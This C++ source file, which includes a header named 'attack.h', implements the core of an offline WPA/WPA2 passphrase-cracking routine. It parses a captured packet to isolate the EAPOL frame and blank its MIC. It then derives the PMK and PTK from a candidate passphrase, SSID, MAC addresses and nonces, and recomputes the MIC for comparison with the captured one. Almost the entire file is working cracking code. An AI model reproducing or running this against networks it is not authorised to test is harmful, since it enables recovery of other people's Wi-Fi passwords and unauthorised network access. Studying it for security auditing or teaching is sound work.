#include "attack.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <algorithm>
#include <iomanip>
#include <openssl/hmac.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/core_names.h>

using namespace std;

vector<uint8_t> hexToBytes(const string& hex) {
    vector<uint8_t> bytes;
    for (int i = 0; i < hex.length(); i += 2) {
        string str = hex.substr(i, 2);
        uint8_t byte = (uint8_t)strtol(str.c_str(), nullptr, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

string bytesToHex(const vector<uint8_t>& bytes) {
    stringstream ss;
    for (uint8_t byte : bytes) {
        ss << hex << setw(2) << setfill('0') << (int) byte;
    }
    return ss.str();
}

vector<uint8_t> changePacketToEapol(const string& packetHex, const string& targetMic) {
    const string llcPattern = "aaaa03000000888e";
    size_t llcOffset = packetHex.find(llcPattern);
    if (llcOffset == string::npos) {
        throw runtime_error("Could not find LLC pattern in packet");
    }

    llcOffset += llcPattern.length();
    string eapolHex = packetHex.substr(llcOffset);

    size_t micOffset = eapolHex.find(targetMic);
    if (micOffset == string::npos) {
        throw runtime_error("Could not find target MIC in packet");
    }

    eapolHex.replace(micOffset, targetMic.length(), targetMic.length(), '0');

    return hexToBytes(eapolHex);
}

vector<uint8_t> concatMacNonce(const vector<uint8_t>& amac, const vector<uint8_t>& smac, const vector<uint8_t>& anonce, const vector<uint8_t>& snonce) {
    vector<uint8_t> concMacNonce;
    if (amac < smac) {
        concMacNonce.insert(concMacNonce.end(), amac.begin(), amac.end());
        concMacNonce.insert(concMacNonce.end(), smac.begin(), smac.end());
    } else {
        concMacNonce.insert(concMacNonce.end(), smac.begin(), smac.end());
        concMacNonce.insert(concMacNonce.end(), amac.begin(), amac.end());
    }
    if (anonce < snonce) {
        concMacNonce.insert(concMacNonce.end(), anonce.begin(), anonce.end());
        concMacNonce.insert(concMacNonce.end(), snonce.begin(), snonce.end());
    } else {
        concMacNonce.insert(concMacNonce.end(), snonce.begin(), snonce.end());
        concMacNonce.insert(concMacNonce.end(), anonce.begin(), anonce.end());
    }
    return concMacNonce;
}

vector<uint8_t> makePMK(const string& passphrase, const string& ssid) {
    vector<uint8_t> pmk(32);
    PKCS5_PBKDF2_HMAC_SHA1(
        passphrase.c_str(), 
        passphrase.length(), 
        (const uint8_t*)ssid.c_str(), 
        ssid.length(), 
        4096, 32, pmk.data());
    return pmk;
}

vector<uint8_t> makePTK(const vector<uint8_t>& pmk, const vector<uint8_t>& concMacNonce) {
    vector<uint8_t> ptk;
    string salt = "Pairwise key expansion";

    int iters = 512/160 + 1;
    for (int i = 0; i <= iters; ++i) {
        EVP_MAC_CTX* ctx = NULL;
        EVP_MAC *mac = NULL;
        size_t outLen = 0;
        uint8_t out[EVP_MAX_MD_SIZE];

        mac = EVP_MAC_fetch(NULL, "HMAC", NULL);
        ctx = EVP_MAC_CTX_new(mac);

        OSSL_PARAM params[] = {
            OSSL_PARAM_construct_utf8_string(OSSL_MAC_PARAM_DIGEST, (char *)"SHA1", 0),
            OSSL_PARAM_construct_end()
        };

        EVP_MAC_init(ctx, pmk.data(), pmk.size(), params);
        EVP_MAC_update(ctx, (const uint8_t*)salt.c_str(), salt.length());

        uint8_t zero = 0x00;
        EVP_MAC_update(ctx, &zero, 1);
        EVP_MAC_update(ctx, concMacNonce.data(), concMacNonce.size());

        uint8_t counter = (uint8_t)i;
        EVP_MAC_update(ctx, &counter, 1);

        EVP_MAC_final(ctx, out, &outLen, sizeof(out));
        ptk.insert(ptk.end(), out, out + outLen);

        EVP_MAC_CTX_free(ctx);
        EVP_MAC_free(mac);
    }
    ptk.resize(64);
    return ptk;
}

string makeMIC(const vector<uint8_t>& ptk, const vector<uint8_t>& eapol) {
    vector<uint8_t> kck(ptk.begin(), ptk.begin() + 16);

    EVP_MAC_CTX *ctx = NULL;
    EVP_MAC *mac = NULL;
    size_t micLen = 0;
    uint8_t mic[EVP_MAX_MD_SIZE];

    mac = EVP_MAC_fetch(NULL, "HMAC", NULL);
    ctx = EVP_MAC_CTX_new(mac);

    OSSL_PARAM params[] = {
        OSSL_PARAM_construct_utf8_string(OSSL_MAC_PARAM_DIGEST, (char *)"SHA1", 0),
        OSSL_PARAM_construct_end()
    };

    EVP_MAC_init(ctx, kck.data(), kck.size(), params);
    EVP_MAC_update(ctx, eapol.data(), eapol.size());
    EVP_MAC_final(ctx, mic, &micLen, sizeof(mic));

    EVP_MAC_CTX_free(ctx);
    EVP_MAC_free(mac);

    stringstream ss;
    for (size_t i = 0; i < micLen && i < 16; ++i) {
        ss << hex << setw(2) << setfill('0') << (int)mic[i];
    }
    return ss.str().substr(0, 32);
}
 
string myHash(const string& passphrase, const string& ssid,
              const vector<uint8_t>& amac, const vector<uint8_t>& smac,
              const vector<uint8_t>& snonce, const vector<uint8_t>& anonce,
              const vector<uint8_t>& concMacNonce, const vector<uint8_t>& eapol) {
    vector<uint8_t> pmk = makePMK(passphrase, ssid);
    vector<uint8_t> ptk = makePTK(pmk, concMacNonce);
    string mic = makeMIC(ptk, eapol);
    return mic;
}